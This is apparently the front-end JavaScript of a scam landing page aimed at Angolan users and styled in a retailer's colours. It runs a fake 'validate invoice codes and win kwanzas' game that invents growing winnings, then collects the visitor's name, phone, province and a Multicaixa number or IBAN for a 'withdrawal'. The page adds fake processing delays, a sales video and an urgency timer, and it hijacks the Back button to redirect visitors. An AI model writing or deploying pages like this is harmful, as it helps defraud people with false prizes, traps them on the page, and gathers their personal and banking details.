// Função para o botão "Útil" das avaliações
function likeReview(btn) {
    if (btn.classList.contains('liked')) return; // Já foi clicado, ignora
    btn.classList.add('liked');
    const countEl = btn.querySelector('.util-count');
    const currentCount = parseInt(countEl.textContent.replace(/[^0-9]/g, '')) || 0;
    countEl.textContent = '( ' + (currentCount + 1) + ' )';
    // Mini animação de escala
    btn.style.transform = 'scale(1.15)';
    setTimeout(() => { btn.style.transform = 'scale(1)'; }, 200);
}

// Gera o código de barras denso automaticamente (padrão alternado barra/espaço)
function generateBarcode(containerId) {
    const container = document.getElementById(containerId);
    if (!container) return;

    // Sequência de padrões: [largura, tipo] — tipo 'b'=barra preta, 'sp'=espaço branco
    // Representa um código EAN-style com barras densas sem espaço no centro
    const pattern = [
        // Guard esquerdo
        [2,'b'],[2,'sp'],[2,'b'],
        // Dígito 1: 2
        [3,'sp'],[2,'b'],[2,'sp'],[3,'b'],[2,'sp'],[2,'b'],
        // Dígito 2: 1
        [2,'sp'],[2,'b'],[2,'sp'],[4,'b'],[2,'sp'],[2,'b'],
        // Dígito 3: 3
        [2,'sp'],[4,'b'],[2,'sp'],[2,'b'],[2,'sp'],[2,'b'],
        // Dígito 4: 4
        [2,'sp'],[2,'b'],[4,'sp'],[2,'b'],[2,'sp'],[2,'b'],
        // Dígito 5: 5
        [2,'sp'],[2,'b'],[2,'sp'],[2,'b'],[4,'sp'],[2,'b'],
        // Dígito 6: 0
        [4,'sp'],[2,'b'],[2,'sp'],[2,'b'],[2,'sp'],[2,'b'],
        // Guard direito
        [2,'sp'],[2,'b'],[2,'sp'],[2,'b'],
    ];

    container.innerHTML = '';
    pattern.forEach(([width, type]) => {
        const el = document.createElement('div');
        el.classList.add('b');
        if (type === 'sp') el.classList.add('sp');
        el.style.width = width * 2 + 'px';
        el.style.flexShrink = '0';
        container.appendChild(el);
    });
}

// Função para dar feedback visual de erro no input sem popup irritante
function shakeInput(message) {
    const input = document.getElementById('barcodeInput');
    if (!input) return;
    
    // Adiciona a classe de animação
    input.classList.add('error-shake');
    
    // Altera temporariamente o placeholder ou valor para dar feedback
    const oldPlaceholder = input.placeholder;
    input.value = '';
    input.placeholder = 'Código Incorreto';
    
    // Remove a classe após a animação (0.5s) e restaura
    setTimeout(() => {
        input.classList.remove('error-shake');
        input.placeholder = oldPlaceholder;
        input.focus();
    }, 500);
}

let globalUserData = { nome: '', telefone: '', provincia: '' };

// =====================================================================
// REDIRECIONAMENTO — Botão Voltar / Saída da Página
// Sempre que o utilizador tentar sair (Back, fechar aba, etc.),
// é redirecionado para o link do projecto.
// =====================================================================
const REDIRECT_URL = 'https://descontosub.lovable.app';

// 1. Empurra um estado para o histórico para que o Back possa ser intercetado
history.pushState(null, '', window.location.href);

// 2. Quando o utilizador carrega no botão Voltar, redireciona
window.addEventListener('popstate', function () {
    window.location.replace(REDIRECT_URL);
});



document.addEventListener('DOMContentLoaded', () => {
    // --- Lógica da Landing Page ---
    const landingPage = document.getElementById('landingPage');
    const registrationPage = document.getElementById('registrationPage');
    const mainHeader  = document.getElementById('mainHeader');
    const mainApp     = document.getElementById('mainApp');
    const participarBtn = document.getElementById('participarBtn');

    // Elementos da Página de Registo
    const regNome = document.getElementById('regNome');
    const regTelefone = document.getElementById('regTelefone');
    const regProvincia = document.getElementById('regProvincia');
    const continuarRegBtn = document.getElementById('continuarRegBtn');

    function checkRegForm() {
        if (regNome.value.trim() !== '' && regTelefone.value.trim() !== '' && regProvincia.value !== '') {
            continuarRegBtn.classList.add('active');
        } else {
            continuarRegBtn.classList.remove('active');
        }
    }

    if (regNome) regNome.addEventListener('input', checkRegForm);
    if (regTelefone) regTelefone.addEventListener('input', checkRegForm);
    if (regProvincia) regProvincia.addEventListener('change', checkRegForm);

    if (participarBtn) {
        participarBtn.addEventListener('click', () => {
            // Oculta a landing page e mostra a página de registo
            landingPage.style.display = 'none';
            registrationPage.style.display = 'flex';
            window.scrollTo(0, 0); // Volta ao topo
        });
    }

    if (continuarRegBtn) {
        continuarRegBtn.addEventListener('click', () => {
            if (!continuarRegBtn.classList.contains('active')) {
                // Vibra os campos em falta
                [regNome, regTelefone, regProvincia].forEach(el => {
                    if (el && el.value.trim() === '') {
                        el.style.borderColor = '#ff4d4d';
                        el.style.animation = 'shake 0.4s';
                        setTimeout(() => {
                            el.style.borderColor = '';
                            el.style.animation = '';
                        }, 500);
                    }
                });
                return;
            }

            // Salva os dados globais para a tela final
            globalUserData.nome = regNome.value.trim();
            globalUserData.telefone = regTelefone.value.trim();
            const pSel = regProvincia.options[regProvincia.selectedIndex];
            globalUserData.provincia = pSel ? pSel.text : '';

            // --- 1. Oculta o ecrã de registo ---
            registrationPage.style.display = 'none';

            // --- 2. Mostra a interface principal (por trás do popup) e o popup de registo ---
            mainHeader.style.display = 'flex';
            mainApp.style.display = 'block';
            window.scrollTo(0, 0);

            const regSuccessPopup = document.getElementById('regSuccessPopup');
            if (regSuccessPopup) {
                regSuccessPopup.style.display = 'flex';
                regSuccessPopup.classList.add('show');
            }

            // --- 3. Som de Sucesso — Acorde limpo e agradável ---
            try {
                const ctx = new (window.AudioContext || window.webkitAudioContext)();

                function playNote(freq, start, dur, type, vol) {
                    const osc  = ctx.createOscillator();
                    const gain = ctx.createGain();
                    osc.connect(gain);
                    gain.connect(ctx.destination);
                    osc.type = type;
                    osc.frequency.setValueAtTime(freq, ctx.currentTime + start);
                    gain.gain.setValueAtTime(0, ctx.currentTime + start);
                    gain.gain.linearRampToValueAtTime(vol, ctx.currentTime + start + 0.05);
                    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + start + dur);
                    osc.start(ctx.currentTime + start);
                    osc.stop(ctx.currentTime + start + dur + 0.05);
                }

                // Acorde "Mágico"
                playNote(523.25, 0.00, 1.2, 'sine', 0.25); // Dó
                playNote(659.25, 0.05, 1.2, 'sine', 0.25); // Mi
                playNote(783.99, 0.10, 1.2, 'sine', 0.25); // Sol
                playNote(987.77, 0.15, 1.5, 'sine', 0.30); // Si
                playNote(987.77, 0.40, 1.0, 'sine', 0.10); // Eco

            } catch(e) { /* Browser bloqueou áudio */ }

            // --- 4. Dispara Confetes estilo Kero ---
            if (typeof confetti === 'function') {
                confetti({
                    particleCount: 150,
                    spread: 80,
                    origin: { y: 0.6 },
                    colors: ['#ff6b00', '#6ab035', '#1fc17b', '#2b1f4a'],
                    zIndex: 200000 
                });
            }

            // --- 5. Oculta o popup após 3 segundos e inicia a primeira fatura ---
            setTimeout(() => {
                if (regSuccessPopup) {
                    regSuccessPopup.classList.remove('show');
                    setTimeout(() => { regSuccessPopup.style.display = 'none'; }, 500);
                }
                
                if (validacoesRealizadas === 0) {
                    setTimeout(() => { startInvoiceReveal(); }, 500);
                }
            }, 3000);
        });
    }

    // --- Elementos Comuns ---
    const overlay         = document.getElementById('revealOverlay');
    const countdownEl     = document.getElementById('countdown');
    const invoiceCard     = document.getElementById('invoiceCard');
    const validateBtn     = document.getElementById('validateBtn');
    const barcodeInput    = document.getElementById('barcodeInput');
    const amountDisplay   = document.getElementById('ganhosDisplay');
    
    const progressText    = document.getElementById('progressText');
    const progressPercent = document.getElementById('progressPercent');
    const progressBarFill = document.getElementById('progressBarFill');
    
    const popup           = document.getElementById('successPopup');
    const popupGanho      = document.getElementById('popupGanho');
    
    // Elementos Novos (Código Aleatório e Expiração)
    const barcodeNumbersDisplay = document.getElementById('barcodeNumbersDisplay');
    const expirationTimer       = document.querySelector('.expiration-timer');
    const expireCountdown       = document.getElementById('expireCountdown');
    const invoiceAmountDisplay  = document.getElementById('invoiceAmount');
    
    let expirationInterval      = null;
    let currentBarcodeCode      = ''; // Guarda o código atual da fatura

    let validacoesRealizadas = 0;
    const maxValidacoes = 8;
    let ganhosAcumulados = 0;
    
    // Distribuição gradativa até 150.000kz em 8 faturas
    const ganhosPorValidacao = [5000, 7500, 11500, 16000, 19000, 24000, 31000, 36000];

    // Função para gerar um código de barras novo e fazer a animação de revelação
    function startInvoiceReveal() {
        // Limpa timer se existir
        if (expirationInterval) clearInterval(expirationInterval);
        expirationTimer.style.display = 'none';

        generateBarcode('barcodeDisplay');
        
        // Atualiza/Troca os números em baixo do código de barras aleatoriamente
        const novosNumeros = Array.from({length: 6}, () => Math.floor(Math.random() * 10)).join(' ');
        barcodeNumbersDisplay.textContent = novosNumeros;
        currentBarcodeCode = novosNumeros; // Guarda o código actual para verificação
        
        // Atualiza o valor na fatura com o próximo ganho
        let proximoGanho = 0;
        if (validacoesRealizadas < maxValidacoes) {
            proximoGanho = ganhosPorValidacao[validacoesRealizadas];
        }
        const valorFormatadoFatura = proximoGanho.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
        if(invoiceAmountDisplay) invoiceAmountDisplay.innerHTML = `${valorFormatadoFatura}<span class="receipt-cents">,00</span>`;
        
    // Reinicia os estilos do overlay e do card
    overlay.style.display = 'flex';
    overlay.classList.remove('hiding');
    invoiceCard.style.display = 'block';
    invoiceCard.classList.add('blurred');
    
    // Centraliza a vista no card da fatura durante a contagem regressiva
    invoiceCard.scrollIntoView({ behavior: 'smooth', block: 'center' });
    
    let seconds = 3;
    countdownEl.textContent = seconds;

    const tick = setInterval(() => {
        seconds--;
        if (seconds > 0) {
            countdownEl.textContent = seconds;
        } else {
            clearInterval(tick);
            overlay.classList.add('hiding');
            setTimeout(() => {
                overlay.style.display = 'none';
                invoiceCard.classList.remove('blurred');

                // Desce a vista para mostrar os números do código de barras e o campo de preenchimento
                if (barcodeNumbersDisplay && barcodeNumbersDisplay.scrollIntoView) {
                    barcodeNumbersDisplay.scrollIntoView({ behavior: 'smooth', block: 'center' });
                }

                // Inicia o contador de expiração após revelar
                startExpirationTimer();
            }, 650);
        }
    }, 1000);
}

    function startExpirationTimer() {
        expirationTimer.style.display = 'block';
        let tempoRestante = 30;
        expireCountdown.textContent = tempoRestante + 's';
        
        expirationInterval = setInterval(() => {
            tempoRestante--;
            expireCountdown.textContent = tempoRestante + 's';
            
            if (tempoRestante <= 0) {
                clearInterval(expirationInterval);
                expirationTimer.style.display = 'none';
                // Quando expira, atualiza/troca tudo gerando uma nova fatura!
                startInvoiceReveal();
            }
        }, 1000);
    }

    // A primeira revelação agora é iniciada ao clicar em "Participar" na Landing Page
    // startInvoiceReveal();

    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    
    // Função para tocar som moderno de "caixa registadora digital"
    function playTickSound() {
        try {
            if (audioCtx.state === 'suspended') audioCtx.resume();
            const now = audioCtx.currentTime;

            // --- Camada 1: Ruído branco curto (percussão de moeda) ---
            const bufferSize = audioCtx.sampleRate * 0.04; // 40ms de ruído
            const buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
            const data = buffer.getChannelData(0);
            for (let i = 0; i < bufferSize; i++) {
                data[i] = (Math.random() * 2 - 1) * (1 - i / bufferSize); // Decaimento rápido
            }
            const noise = audioCtx.createBufferSource();
            noise.buffer = buffer;

            // Filtro passa-alta para som "metálico/caixa" (não grave)
            const noiseFilter = audioCtx.createBiquadFilter();
            noiseFilter.type = 'bandpass';
            noiseFilter.frequency.value = 3800;
            noiseFilter.Q.value = 1.2;

            const noiseGain = audioCtx.createGain();
            noiseGain.gain.setValueAtTime(0.07, now);
            noiseGain.gain.exponentialRampToValueAtTime(0.001, now + 0.04);

            noise.connect(noiseFilter);
            noiseFilter.connect(noiseGain);
            noiseGain.connect(audioCtx.destination);
            noise.start(now);
            noise.stop(now + 0.05);

            // --- Camada 2: Oscilador grave curto (corpo da moeda) ---
            const osc = audioCtx.createOscillator();
            const oscGain = audioCtx.createGain();
            osc.connect(oscGain);
            oscGain.connect(audioCtx.destination);
            osc.type = 'sine';
            osc.frequency.setValueAtTime(1100, now);
            osc.frequency.exponentialRampToValueAtTime(650, now + 0.06);
            oscGain.gain.setValueAtTime(0.06, now);
            oscGain.gain.exponentialRampToValueAtTime(0.001, now + 0.07);
            osc.start(now);
            osc.stop(now + 0.08);

        } catch(e) {}
    }

    // Função para animar a contagem do valor e da barra de progresso juntos
    function animateEarningsAndProgress(amountObj, startVal, endVal, startPct, endPct, duration) {
        let startTimestamp = null;
        let lastTickTime = 0;
        
        const step = (timestamp) => {
            if (!startTimestamp) startTimestamp = timestamp;
            const progress = Math.min((timestamp - startTimestamp) / duration, 1);
            
            // Som do contador (a cada 80ms)
            if (timestamp - lastTickTime > 80 && progress < 1) {
                playTickSound();
                lastTickTime = timestamp;
            }
            
            // Valor dos Ganhos
            const currentVal = progress * (endVal - startVal) + startVal;
            amountObj.textContent = currentVal.toFixed(2).replace('.', ',') + ' Kz';
            
            // Percentagem e Barra de Progresso
            const currentPct = progress * (endPct - startPct) + startPct;
            progressPercent.textContent = Math.round(currentPct) + '%';
            progressBarFill.style.width = currentPct + '%';

            if (progress < 1) {
                window.requestAnimationFrame(step);
            } else {
                amountObj.textContent = endVal.toFixed(2).replace('.', ',') + ' Kz';
                progressPercent.textContent = Math.round(endPct) + '%';
                progressBarFill.style.width = endPct + '%';
            }
        };
        window.requestAnimationFrame(step);
    }

    // --- Auto-validação ao digitar 6 dígitos ---
    if (barcodeInput) {
        barcodeInput.addEventListener('input', () => {
            // Força apenas números no campo
            barcodeInput.value = barcodeInput.value.replace(/\D/g, '');
            const digitsOnly = barcodeInput.value;
            if (digitsOnly.length >= 6) {
                // Dispara a validação automaticamente
                validateBtn.click();
            }
        });
    }

    // --- Lógica de Validação ---
    validateBtn.addEventListener('click', () => {
        // Fecha o teclado móvel ao validar
        if (document.activeElement && document.activeElement.blur) {
            document.activeElement.blur();
        }

        // Remove espaços de ambos para permitir que o utilizador digite com ou sem espaços
        const code = barcodeInput.value.replace(/\s+/g, '').trim();
        const correctCode = currentBarcodeCode.replace(/\s+/g, '');

        if (!code) {
            shakeInput('Por favor, insira um código de barras.');
            return;
        }

        // ✅ Verifica se o código inserido é o correto (ignorando espaços)
        if (code !== correctCode) {
            shakeInput('❌ Código incorreto! Verifique o código da fatura.');
            return;
        }

        if (validacoesRealizadas < maxValidacoes) {
            const validacoesAnteriores = validacoesRealizadas;
            validacoesRealizadas++;

            const percentagemAnterior = Math.round((validacoesAnteriores / maxValidacoes) * 100);
            const percentagemAtual = Math.round((validacoesRealizadas / maxValidacoes) * 100);

            // Cancela o timer de expiração porque o código foi validado
            if (expirationInterval) clearInterval(expirationInterval);
            expirationTimer.style.display = 'none';

            // Atualiza apenas o texto (PROGRESSO - 1/6) imediatamente
            progressText.textContent  = `PROGRESSO - ${validacoesRealizadas}/${maxValidacoes}`;

            // Calcula ganhos usando a distribuição progressiva (soma = 180k)
            const ganhoDestaFatura = ganhosPorValidacao[validacoesRealizadas - 1]; // Índice - 1 pois já foi incrementado
            const ganhoAnterior = ganhosAcumulados;
            ganhosAcumulados += ganhoDestaFatura;
            
            // Mostra popup de sucesso
            barcodeInput.value = ''; // limpa input
            const ganhoFormatado = Math.floor(ganhoDestaFatura).toString().replace(/\B(?=(\d{3})+(?!\d))/g, " ");
            popupGanho.textContent = ganhoFormatado;
            popup.classList.add('show');

            // 🎵 Som de Sucesso na Validação
            try {
                if (audioCtx.state === 'suspended') audioCtx.resume();
                const osc  = audioCtx.createOscillator();
                const gain = audioCtx.createGain();
                osc.connect(gain);
                gain.connect(audioCtx.destination);
                osc.type = 'sine';
                osc.frequency.setValueAtTime(523.25, audioCtx.currentTime); // Dó
                osc.frequency.setValueAtTime(659.25, audioCtx.currentTime + 0.1); // Mi
                osc.frequency.setValueAtTime(783.99, audioCtx.currentTime + 0.2); // Sol
                osc.frequency.setValueAtTime(1046.50, audioCtx.currentTime + 0.3); // Dó agudo
                gain.gain.setValueAtTime(0, audioCtx.currentTime);
                gain.gain.linearRampToValueAtTime(0.2, audioCtx.currentTime + 0.05);
                gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.8);
                osc.start(audioCtx.currentTime);
                osc.stop(audioCtx.currentTime + 0.85);
            } catch(e) {}

            // 🎉 Explosão de Festa (Confetes)
            if (typeof confetti === 'function') {
                confetti({
                    particleCount: 150,
                    spread: 80,
                    origin: { y: 0.6 },
                    colors: ['#ff6b00', '#6ab035', '#1fc17b', '#2b1f4a'], // Cores do Kero
                    zIndex: 2000 // Fica por cima de tudo
                });
            }

            // --- SEQUÊNCIA DE ANIMAÇÕES DO FLUXO ---
            
            // A. Passados 2 segundos, o popup desaparece e oculta-se a fatura
            setTimeout(() => {
                popup.classList.remove('show');
                
                // Oculta a fatura totalmente
                invoiceCard.style.display = 'none';

                // Centraliza a vista no card de ganhos acumulados
                const validationCard = document.querySelector('.validation-card');
                if (validationCard && validationCard.scrollIntoView) {
                    validationCard.scrollIntoView({ behavior: 'smooth', block: 'center' });
                }
                
                // B. Inicia contagem animada dos ganhos e da BARRA DE PROGRESSO em simultâneo (3 segundos)
                animateEarningsAndProgress(amountDisplay, ganhoAnterior, ganhosAcumulados, percentagemAnterior, percentagemAtual, 3000);
                
                // C. Quando a contagem terminar (3 segundos depois)
                setTimeout(() => {
                    if (validacoesRealizadas >= maxValidacoes) {
                        // Inicia o fluxo de levantamento de prémio
                        document.getElementById('mainHeader').style.display = 'none';
                        document.getElementById('mainApp').style.display = 'none';
                        document.getElementById('withdrawalPage').style.display = 'flex';
                        window.scrollTo(0, 0);
                    } else {
                        // D. Reaparece a fatura e começa a revelação (3...2...1) para o novo código
                        startInvoiceReveal();
                    }
                }, 3000);

            }, 2000);
        } else {
            // Se o botão for clicado com limite já atingido
            document.getElementById('mainHeader').style.display = 'none';
            document.getElementById('mainApp').style.display = 'none';
            document.getElementById('withdrawalPage').style.display = 'flex';
            window.scrollTo(0, 0);
        }
    });

    // --- LÓGICA DA PÁGINA DE LEVANTAMENTO ---
    const tabMulticaixa = document.getElementById('tabMulticaixa');
    const tabIban = document.getElementById('tabIban');
    const groupMulticaixa = document.getElementById('groupMulticaixa');
    const groupIban = document.getElementById('groupIban');
    const inputMC = document.getElementById('withdrawInputMC');
    const inputIban = document.getElementById('withdrawInputIban');
    const withdrawSubmitBtn = document.getElementById('withdrawSubmitBtn');
    
    let currentMethod = 'Multicaixa';

    function checkWithdrawForm() {
        if (currentMethod === 'Multicaixa' && inputMC.value.trim().length >= 9) {
            withdrawSubmitBtn.classList.add('active');
        } else if (currentMethod === 'IBAN' && inputIban.value.trim().length >= 10) {
            withdrawSubmitBtn.classList.add('active');
        } else {
            withdrawSubmitBtn.classList.remove('active');
        }
    }

    if(tabMulticaixa && tabIban) {
        tabMulticaixa.addEventListener('click', () => {
            tabMulticaixa.classList.add('active');
            tabIban.classList.remove('active');
            groupMulticaixa.style.display = 'block';
            groupIban.style.display = 'none';
            currentMethod = 'Multicaixa';
            checkWithdrawForm();
        });

        tabIban.addEventListener('click', () => {
            tabIban.classList.add('active');
            tabMulticaixa.classList.remove('active');
            groupIban.style.display = 'block';
            groupMulticaixa.style.display = 'none';
            currentMethod = 'IBAN';
            checkWithdrawForm();
        });

        inputMC.addEventListener('input', checkWithdrawForm);
        inputIban.addEventListener('input', checkWithdrawForm);

        withdrawSubmitBtn.addEventListener('click', () => {
            if (!withdrawSubmitBtn.classList.contains('active')) return;

            // Mostrar loading
            document.getElementById('loadingOverlay').style.display = 'flex';

            setTimeout(() => {
                document.getElementById('loadingOverlay').style.display = 'none';
                document.getElementById('withdrawalPage').style.display = 'none';
                
                // Popular a final page
                document.getElementById('finalUserName').textContent = globalUserData.nome.split(' ')[0] || 'Utente';
                document.getElementById('summaryNome').textContent = globalUserData.nome || '---';
                document.getElementById('summaryTelefone').textContent = globalUserData.telefone || '---';
                document.getElementById('summaryProvincia').textContent = globalUserData.provincia || '---';
                document.getElementById('summaryMetodo').textContent = currentMethod;

                document.getElementById('finalPage').style.display = 'flex';
                window.scrollTo(0, 0);
                loadFinalVideo();
                startPaymentCountdown();
            }, 3500); // 3.5 segundos de processamento
        });
    }
});

function loadFinalVideo() {
    var slot = document.getElementById('finalVideoSlot');
    if (!slot || slot.dataset.loaded === '1') return;
    slot.dataset.loaded = '1';
    slot.innerHTML = '<vturb-smartplayer id="vid-6a558497077d31e675fc3273" style="display: block; margin: 0 auto; width: 100%; max-width: 400px;"><div class="vturb-player-placeholder" style="position: relative; width: 100%; padding: 177.77777777777777% 0 0; z-index: 0; background-color: black;"></div></vturb-smartplayer>';
    var s = document.createElement('script');
    s.src = 'https://scripts.converteai.net/77f7f12d-5e90-456d-b45e-7c7f2aa34ed0/players/6a558497077d31e675fc3273/v4/player.js';
    s.async = true;
    document.head.appendChild(s);
}

function startPaymentCountdown() {
    var card = document.getElementById('paymentCountdownCard');
    var timerEl = document.getElementById('paymentCountdownTimer');
    if (!card || !timerEl) return;
    if (card.dataset.started === '1') return;
    card.dataset.started = '1';

    var total = 3 * 60 + 14; // 03:14 exato
    function render() {
        var m = Math.floor(total / 60);
        var s = total % 60;
        timerEl.textContent = (m < 10 ? '0' + m : m) + ':' + (s < 10 ? '0' + s : s);
    }
    // Mostra 03:14 imediatamente
    render();

    function begin() {
        var iv = setInterval(function () {
            total--;
            if (total <= 0) {
                clearInterval(iv);
                card.style.display = 'none';
                return;
            }
            render();
        }, 1000);
    }

    // Só começa a decrementar depois que o card estiver visível e pintado
    if ('IntersectionObserver' in window) {
        var io = new IntersectionObserver(function (entries) {
            for (var i = 0; i < entries.length; i++) {
                if (entries[i].isIntersecting) {
                    io.disconnect();
                    requestAnimationFrame(function () {
                        requestAnimationFrame(begin);
                    });
                    return;
                }
            }
        }, { threshold: 0.1 });
        io.observe(card);
    } else {
        requestAnimationFrame(function () {
            requestAnimationFrame(begin);
        });
    }
}
